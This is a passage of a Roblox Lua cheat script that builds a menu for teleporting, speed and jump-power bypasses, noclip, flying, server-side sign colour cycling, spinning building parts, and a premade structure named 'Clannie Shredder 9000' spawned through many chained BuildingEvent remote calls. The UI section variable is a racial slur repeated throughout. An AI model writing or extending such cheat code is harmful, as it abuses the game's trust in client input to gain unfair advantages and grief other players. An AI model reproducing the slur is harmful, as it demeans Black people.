        if var.ASG and LocalPlayer.Character:WaitForChild("Humanoid").Health <= a then
            semigod()
        end
    end)

    -- Teleports
    
    local tps = {
        CFrame.new(1175.8155517578, 295.88626098633, -2039.1275634766);
        CFrame.new(-1189.3514404297, 126.02531433105, 98.057037353516);
        CFrame.new(-634.21105957031, 183.02993774414, -1765.4357910156);
        CFrame.new(1602.0971679688, 259.73001098633, 742.41296386719);
        CFrame.new(-313.63897705078, 153.65187072754, -148.57489013672);
    }
    
    local Movementtab = Main.SideTab("Movement",3.4)
    
    local nigger = Movementtab.Section("Teleports")
        
    nigger.Toggle("Click Teleport",var.Clicktp,function(a)
        var.Clicktp = a
        togglenote("Click Teleport",var.Clicktp)
    end)
    
    nigger.KeyBind("Click Teleport Keybind",var.ctpbind,function(a)
        var.ctpbind = a
    end)
    
    nigger.Toggle("Died Teleport",var.diedtp,function(a)
        var.diedtp = a
        togglenote("Died Teleport",var.diedtp)
    end)
    
    nigger.Dropdown("Teleport to Location",{"Vine Yard","RyIock's Scrapyard","Flinkton","Repconn","Town"},function(a)
        if a == "Vine Yard" then
            Tween(tps[1], 1)
        elseif a == "RyIock's Scrapyard" then
            Tween(tps[2], 1)
        elseif a == "Flinkton" then
            Tween(tps[3], 1)
        elseif a == "Repconn" then
            Tween(tps[4], 1)
        elseif a == "Town" then
            Tween(tps[5], 1)
        end
        wait(1)
        sendnotification("Arrived at "..a)
    end)
    
    nigger.Button("Surprise Me!", function() 
        Tween(tps[math.random(1, #tps)], 1)
        sendnotification("Arrived at a random place")
    end)

    nigger.Label("Movement")
    
    nigger.Toggle("CFrame Walkspeed",var.Walkspeed,function(a)
        var.Walkspeed = a
        togglenote("Walkspeed",var.Walkspeed)
    end)
    
    nigger.Slider("CFrame Walk Speed",0,30,var.walkspeeds,true,function(a)
        var.walkspeeds = a
    end)
    
    nigger.KeyBind("CFrame Walkspeed Keybind",var.WalkspeedBind,function(a)
        var.WalkspeedBind = a
    end)
    
    nigger.Toggle("Walkspeed",var.wsbypass,function(a)
        var.wsbypass = a
        togglenote("Walkspeed",var.wsbypass)
        if a then
            bodymods()
        else
            LocalPlayer.Character:FindFirstChild("Humanoid").WalkSpeed = 16
        end
    end)

    nigger.Slider("Walk Speed",0,1000,var.bypassws,false,function(a)
        var.bypassws = a
    end)

    nigger.Toggle("Jump Power",var.jpbypass,function(a)
        var.jpbypass = a
        togglenote("Jump Power",var.jpbypass)
        if a then
            bodymods()
        else 
            LocalPlayer.Character:FindFirstChild("Humanoid").JumpPower = 50
        end
    end)

    nigger.Slider("Jump Power",0,1000,var.bypassjp,false,function(a)
        var.bypassjp = a
    end)
    
    nigger.Toggle("Infinite Jump",var.infjump,function(a)
        var.infjump = a
        togglenote("Infinite Jump",var.infjump)
    end)
    
    nigger.Toggle("Fly Jump",var.flyjump,function(a)
        var.flyjump = a
        togglenote("Fly Jump",var.flyjump)
    end)

    nigger.Label("Noclips")

    nigger.Toggle("No Collisions",var.nocol,function(a)
        var.nocol = a
        togglenote("No Collisions",var.nocol)
    end)
    nigger.Toggle("Noclip",var.noclip1,function(a)
        var.noclip1 = a
        togglenote("Noclip",var.noclip1)
        if not a then
			var.noclip = false
		end
    end)
    
    nigger.KeyBind("Noclip Key",var.nckey,function(a)
        var.nckey = a
    end)

    nigger.Label("Animations")

    nigger.Dropdown("Animation",{"Lay","Chicken Dance","Sit","Fighting","Yawn","Dead Inside","Look Around","Agree","Bored","Dealing","Waving","Woozy"},function(a)
        for i,v in ipairs(game:GetService("ReplicatedStorage"):WaitForChild("Animations"):WaitForChild("WheelAnims"):GetChildren()) do
            if a == v.Name then
                LocalPlayer.Character.Humanoid:LoadAnimation(v):Play()
            end
        end
    end)

    nigger.Button("Stop Animation",function()
        for i,v in ipairs(LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
            v:Stop()
        end
    end)

    nigger.Slider("Animation Speed",0,200,var.animspeed,false,function(a)
        var.animspeed = a
    end)

    nigger.Button("Apply Animation Speed",function()
        for i,v in ipairs(LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
            v:AdjustSpeed(var.animspeed)
        end
        sendnotification("Modded your Animation Speed")
    end)

    local build = Main.SideTab("Buildings",5)

    local bu = build.Section("RGB Signs")

    bu.Box("Billboard Text","Text",function(a)
        var.text = a
    end)

    bu.Slider("RGB Increment Speed",0,100,var.increment,true,function(a)
        var.increment = a
    end)

    bu.Button("Click RGB Sign",function()
        local mouse = LocalPlayer:GetMouse()
        local a
        local j
        j = mouse.Button1Down:Connect(function()
            if mouse.Target ~= nil and mouse.Target.Parent.Name:find("Billboard") and mouse.Target:GetFullName():find("Buildings."..LocalPlayer.Name) then
                local tar = mouse.Target.Parent
                local te = var.text
                a = game:GetService("RunService").Stepped:Connect(function()
                    pcall(function()
                        if not tar.Parent.Parent:FindFirstChild(LocalPlayer.Name) or not tar.Parent:FindFirstChild(tar.Name) then
                            a:Disconnect()
                        end
                    end)
                    game:GetService("ReplicatedStorage").Events.MenuActionEvent:FireServer(7, tar, {te, Color3.fromHSV(tick() % var.increment / var.increment, 1, 1)})
                end)
                j:Disconnect()
                sendnotification("Made Sign RGB (Serversided)")
            end
        end)
    end)
    
    bu.Label("Tornodedo (thank poopis#1826 for helping)")
    
    bu.Slider("dis. subbed between mid & Edge",0,20,var.nsnodedistance or 0,false,function(a)
    	var.nsnodedistance = a
    end)
    
    bu.Slider("Height Distance",1,20,var.nsangleamount or 4,false,function(a)
    	var.nsangleamount = a
    end)
    
    bu.Slider("Prop per Row",1,20,var.nsoffsetamount or 2,false,function(a)
    	var.nsoffsetamount = a/2
    end)
    
    bu.Slider("Height",1,20,var.nsoffsetamount or 4,false,function(a)
		var.nsheight = a
    end)
    
    bu.Slider("Random Increment idfk",-20,20,var.nsoffsetamount or -6,false,function(a)
		var.nsincrement = a
    end)
    
    bu.Slider("Place Time",.25,20,var.nsspeed or .3,true,function(a)
    	var.nsspeed = a
    end)
    
    bu.Button("Spin Node",function()
		local offsetamount = var.nsoffsetamount or 2
		local heightamount = var.nsheightamount or 4
		local increment = var.nsincrement or -6
		local height = var.nsheight or 4
		local angleamount = var.nsangleamount or 4
		local nodedis = var.nsnodedistance or 0

		local node = workspace.Buildings:FindFirstChild(LocalPlayer.Name)
		local center = node.Node:GetPivot()
		local offset = 0
		local propamount = 0
		while task.wait(var.nsspeed or .3) do
			if not workspace.Buildings:FindFirstChild(LocalPlayer.Name) or var.stopspin then break end
			local parts = node:GetChildren()
			local amount = #parts - 1 --cus oneof them is node object
			local ang = (360*angleamount) / amount
			local height = 30 / amount
			for i,v in pairs(parts) do
				if offset > #node:GetChildren() then
					offset = 0
				end
				if v.Name ~= "Node" then
					local new = center * CFrame.Angles(0,math.rad(ang * (i + (offset*offsetamount))),0)
					new = (new + (new.LookVector * (amount - (nodedis)))) + Vector3.new(0,(height/heightamount) * (i*(increment)),0)
					game:GetService("ReplicatedStorage").Events.BuildingEvent:FireServer(5,v,new)
					offset += 1
				end
			end
		end
    end)
    
    bu.Button("Stop spinning node",function()
    	var.stopspin = true
    	wait(var.nsspeed+2 or .5)
    	var.stopspin = false
    end)
    
    bu.Label("Pre-Made Nodes")
    
    bu.Button("Clannie Shredder 9000",function()
		local buildevent = Game:GetService("ReplicatedStorage").Events.BuildingEvent
		local ingamematerials = {Enum.Material.Brick,Enum.Material.Cobblestone,Enum.Material.Concrete,Enum.Material.CorrodedMetal,Enum.Material.DiamondPlate,Enum.Material.Fabric,Enum.Material.Foil,Enum.Material.Glass,Enum.Material.Granite,Enum.Material.Grass,Enum.Material.Ice,Enum.Material.Marble,Enum.Material.Metal,Enum.Material.Pebble,Enum.Material.Plastic,Enum.Material.Sand,Enum.Material.Slate,Enum.Material.SmoothPlastic,Enum.Material.Wood,Enum.Material.WoodPlanks}
		if not game:GetService("Workspace").Buildings:FindFirstChild(LocalPlayer.Name) then buildevent:FireServer(1, "Node", LocalPlayer.Character:GetPivot()) end
		game:GetService("Workspace").Buildings:WaitForChild(LocalPlayer.Name).Node.PrimaryPart.Size = Vector3.new(50,50,50)
		buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1288.74048, 344.605164, -617.803284, 0.866040111, 0.499974549, -5.5283308e-06, 5.5283308e-06, -2.06232071e-05, -0.99999994, -0.499974549, 0.866040051, -2.06232071e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1345.75488, 375.257538, -711.23053, -0.750030518, -0.499900341, 0.433074921, -0.50000608, -6.50882721e-05, -0.866021931, 0.432952851, -0.866082966, -0.249904394))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1330.66479, 340.822449, -719.940857, -0.433034182, -0.499921203, -0.750040054, 0.866027713, -5.24520874e-06, -0.499995947, 0.249954671, -0.866070867, 0.432947934))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1367.02356, 340.822449, -698.952271, -0.432947874, -0.499948561, 0.750071645, -0.866055071, -8.10623169e-05, -0.499948561, 0.250009388, -0.866055071, -0.432947874))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1330.66479, 340.822449, -719.940857, -0.866039991, -0.499974549, -5.5283308e-06, -5.5283308e-06, 2.06232071e-05, -0.99999994, 0.499974549, -0.866040051, -2.06232071e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1330.66479, 340.822449, -719.940857, -0.750030637, -0.499926746, -0.433044404, 0.500032485, -4.06503677e-05, -0.866006672, 0.432922333, -0.866067708, 0.250010014))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1330.66479, 340.822449, -719.940857, -0.432947874, -0.499948561, 0.750071645, -0.866055071, -8.10623169e-05, -0.499948561, 0.250009388, -0.866055071, -0.432947874))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1330.66479, 340.822449, -719.940857, -0.750030518, -0.499900341, 0.433074921, -0.50000608, -6.50882721e-05, -0.866021931, 0.432952851, -0.866082966, -0.249904394))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1309.26892, 375.257416, -732.292542, -0.866039991, -0.499974549, -5.5283308e-06, -5.5283308e-06, 2.06232071e-05, -0.99999994, 0.499974549, -0.866040051, -2.06232071e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1294.70557, 340.822357, -740.697998, -0.432947874, -0.499948561, 0.750071645, -0.866055071, -8.10623169e-05, -0.499948561, 0.250009388, -0.866055071, -0.432947874))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1367.02356, 340.822449, -698.952271, -0.433034182, -0.499921203, -0.750040054, 0.866027713, -5.24520874e-06, -0.499995947, 0.249954671, -0.866070867, 0.432947934))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1367.02356, 340.822449, -698.952271, -0.750030637, -0.499926746, -0.433044404, 0.500032485, -4.06503677e-05, -0.866006672, 0.432922333, -0.866067708, 0.250010014))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1367.02356, 340.822449, -698.952271, -0.866039991, -0.499974549, -5.5283308e-06, -5.5283308e-06, 2.06232071e-05, -0.99999994, 0.499974549, -0.866040051, -2.06232071e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1367.02356, 340.822449, -698.952271, -0.750030518, -0.499900341, 0.433074921, -0.50000608, -6.50882721e-05, -0.866021931, 0.432952851, -0.866082966, -0.249904394))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1367.02356, 340.822449, -698.952271, -2.05039978e-05, -0.499938965, -0.866060615, 1, -2.05039978e-05, -1.18613243e-05, -1.18613243e-05, -0.866060615, 0.499938965))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1294.70557, 340.822357, -740.697998, -2.05039978e-05, -0.499938965, -0.866060615, 1, -2.05039978e-05, -1.18613243e-05, -1.18613243e-05, -0.866060615, 0.499938965))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1294.70557, 340.822357, -740.697998, -0.433034182, -0.499921203, -0.750040054, 0.866027713, -5.24520874e-06, -0.499995947, 0.249954671, -0.866070867, 0.432947934))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1294.70557, 340.822357, -740.697998, -0.750030637, -0.499926746, -0.433044404, 0.500032485, -4.06503677e-05, -0.866006672, 0.432922333, -0.866067708, 0.250010014))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1294.70557, 340.822357, -740.697998, -0.866039991, -0.499974549, -5.5283308e-06, -5.5283308e-06, 2.06232071e-05, -0.99999994, 0.499974549, -0.866040051, -2.06232071e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1294.70557, 340.822357, -740.697998, -0.750030518, -0.499900341, 0.433074921, -0.50000608, -6.50882721e-05, -0.866021931, 0.432952851, -0.866082966, -0.249904394))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1330.66479, 340.822449, -719.940857, -2.05039978e-05, -0.499938965, -0.866060615, 1, -2.05039978e-05, -1.18613243e-05, -1.18613243e-05, -0.866060615, 0.499938965))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1345.75488, 375.257538, -711.23053, -0.432947874, -0.499948561, 0.750071645, -0.866055071, -8.10623169e-05, -0.499948561, 0.250009388, -0.866055071, -0.432947874))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1309.26892, 375.257416, -732.292542, -0.433034182, -0.499921203, -0.750040054, 0.866027713, -5.24520874e-06, -0.499995947, 0.249954671, -0.866070867, 0.432947934))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1309.26892, 375.257416, -732.292542, -0.750030637, -0.499926746, -0.433044404, 0.500032485, -4.06503677e-05, -0.866006672, 0.432922333, -0.866067708, 0.250010014))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1309.26892, 375.257416, -732.292542, -0.750030518, -0.499900341, 0.433074921, -0.50000608, -6.50882721e-05, -0.866021931, 0.432952851, -0.866082966, -0.249904394))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1309.26892, 375.257416, -732.292542, -0.432947874, -0.499948561, 0.750071645, -0.866055071, -8.10623169e-05, -0.499948561, 0.250009388, -0.866055071, -0.432947874))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1309.26892, 375.257416, -732.292542, -2.05039978e-05, -0.499938965, -0.866060615, 1, -2.05039978e-05, -1.18613243e-05, -1.18613243e-05, -0.866060615, 0.499938965))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1345.75488, 375.257538, -711.23053, -2.05039978e-05, -0.499938965, -0.866060615, 1, -2.05039978e-05, -1.18613243e-05, -1.18613243e-05, -0.866060615, 0.499938965))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1345.75488, 375.257538, -711.23053, -0.433034182, -0.499921203, -0.750040054, 0.866027713, -5.24520874e-06, -0.499995947, 0.249954671, -0.866070867, 0.432947934))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1345.75488, 375.257538, -711.23053, -0.750030637, -0.499926746, -0.433044404, 0.500032485, -4.06503677e-05, -0.866006672, 0.432922333, -0.866067708, 0.250010014))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1345.75488, 375.257538, -711.23053, -0.866039991, -0.499974549, -5.5283308e-06, -5.5283308e-06, 2.06232071e-05, -0.99999994, 0.499974549, -0.866040051, -2.06232071e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1372.47693, 375.76355, -643.690125, 0.433011115, -0.865976095, -0.250173539, -0.50001061, 0.000167369843, -0.866019249, 0.749993801, 0.500085354, -0.432924747))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1383.21155, 340.981934, -662.281006, 0.250115693, -0.865964949, 0.433066756, 0.866025984, 8.51750374e-05, -0.499998927, 0.432944685, 0.500104666, 0.749969482))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1341.32727, 340.981506, -589.7453, -0.250010014, -0.865980268, -0.433097273, -0.866041303, -2.05039978e-05, 0.499972522, -0.432975203, 0.500078261, -0.749969482))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 